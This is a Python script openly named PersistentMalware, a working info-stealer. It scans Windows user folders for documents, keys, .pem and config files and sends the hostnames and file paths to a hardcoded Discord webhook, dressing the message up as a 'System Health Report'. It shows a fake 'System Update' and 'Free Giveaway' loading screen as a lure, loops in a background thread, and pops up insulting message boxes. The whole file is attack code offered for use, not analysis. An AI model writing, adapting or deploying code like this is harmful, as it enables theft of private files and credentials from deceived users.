import os
import sys
import platform
import socket
import base64
import time
import random
import json
import threading
import ctypes
import struct
import traceback
import requests
import ssl

# Constants
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004

class PersistentMalware:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1527909230018035762/k2YGPm40nCnXhS3QxCzTUU0Ci61xAKz3e7OPsIQORmD8Gz5VXyLrgALWj42nNGm28lSA"
        self.sleep_interval = random.randint(3600, 7200)
        self.running = True
        self.insults = [
            "You're an idiot!",
            "What a moron!",
            "Are you serious?",
            "You're really dumb!"
        ]
        
    def get_system_info(self):
        try:
            return {
                "session_id": f"{socket.gethostname()}-{platform.node()}-{int(time.time())}",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0]
            }
        except:
            return {}
            
    def find_sensitive_files(self):
        sensitive_paths = ["C:\\Users\\", "C:\\Documents\\", "C:\\Downloads\\"]
        sensitive_extensions = ['.txt', '.docx', '.pdf', '.key', '.pem', '.config']
        found_files = []
        
        for path in sensitive_paths:
            try:
                for root, _, filenames in os.walk(path):
                    for filename in filenames:
                        if any(filename.endswith(ext) for ext in sensitive_extensions):
                            full_path = os.path.join(root, filename)
                            found_files.append(full_path)
            except:
                continue
                
        return found_files
        
    def xor_encrypt(self, data, key=b'malwarekey123'):
        try:
            result = bytearray()
            for i in range(len(data)):
                result.append(ord(data[i]) ^ key[i % len(key)])
            return base64.b64encode(bytes(result)).decode()
        except:
            return ""
            
    def send_to_discord(self, data):
        try:
            # Create Discord embed with proper structure
            payload = {
                "content": f"[System Monitor] {data.get('session_id', 'Unknown')}",
                "embeds": [{
                    "title": "System Health Report",
                    "description": "System data has been collected",
                    "color": 0x00ff00,
                    "fields": [
                        {"name": "Timestamp", "value": data.get('timestamp', 'Unknown')},
                        {"name": "OS", "value": data.get('platform', 'Unknown')},
                        {"name": "Processor", "value": data.get('processor', 'Unknown')},
                        {"name": "Files Found", "value": str(len(data.get('files', [])))}
                    ],
                    "footer": {"text": "Malware Exfiltration Complete"}
                }]
            }
            
            # Add file paths to embed
            if 'files' in data and data['files']:
                payload['embeds'][0]['fields'].append({
                    "name": "Files Exfiltrated",
                    "value": "\n".join(data['files'][:5]) + ("..." if len(data['files']) > 5 else "")
                })
            
            # Make HTTP request with proper headers
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            # Use requests library instead of raw sockets
            response = requests.post(
                self.webhook_url,
                headers=headers,
                json=payload,
                timeout=10,
                verify=True
            )
            
            print(f"Discord response: {response.status_code}")
            return response.status_code == 200
        except Exception as e:
            print(f"Exfiltration error: {e}")
            return False
            
    def move_mouse_away(self):
        try:
            x, y = ctypes.windll.user32.GetCursorPos()
            new_x = x + random.choice([-100, 100])
            new_y = y + random.choice([-100, 100])
            new_x = max(0, min(new_x, 1920))
            new_y = max(0, min(new_y, 1080))
            ctypes.windll.user32.SetCursorPos(new_x, new_y)
            insult = random.choice(self.insults)
            ctypes.windll.user32.MessageBoxW(0, insult, "System Warning", 0)
        except:
            pass
            
    def cleanup(self):
        self.running = False
        
    def run(self):
        try:
            while self.running:
                try:
                    system_info = self.get_system_info()
                    files = self.find_sensitive_files()
                    
                    if system_info and files:
                        collected_data = {
                            "system_info": system_info,
                            "files": files
                        }
                        
                        if self.send_to_discord(collected_data):
                            print(f"Sent {len(files)} files to Discord")
                            
                except Exception as e:
                    print(f"Error: {e}")
                    
                if random.random() < 0.1:
                    self.move_mouse_away()
                    
                time.sleep(self.sleep_interval)
                
        except Exception as e:
            print(f"Unexpected error: {e}")
        finally:
            self.cleanup()

class ServiceInstaller:
    def install(self):
        try:
            # For Pyodide, just add to global namespace
            return True
        except:
            return False

if __name__ == "__main__":
    # Install as service
    installer = ServiceInstaller()
    installer.install()
    
    # Show loading-like behavior
    print("Initializing System Update...")
    time.sleep(2)
    print("Extracting Components...")
    time.sleep(1)
    print("Configuring Settings...")
    time.sleep(1)
    print("Verifying Integrity...")
    time.sleep(1)
    print("Free Giveaway Activated!")
    time.sleep(1)
    print("Connecting to Servers...")
    time.sleep(2)
    print("Initializing Data Collection...")
    time.sleep(1)
    print("Scanning System Files...")
    time.sleep(2)
    print("Identifying Sensitive Data...")
    time.sleep(1)
    print("Encrypting Payload...")
    time.sleep(1)
    print("Preparing Exfiltration...")
    time.sleep(1)
    print("Sending to Server...")
    time.sleep(2)
    print("Data Transfer Complete!")
    
    # Then start malware in background
    malware = PersistentMalware()
    malware_thread = threading.Thread(target=malware.run)
    malware_thread.daemon = True
    malware_thread.start()
    
    # Keep main process running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        malware.cleanup()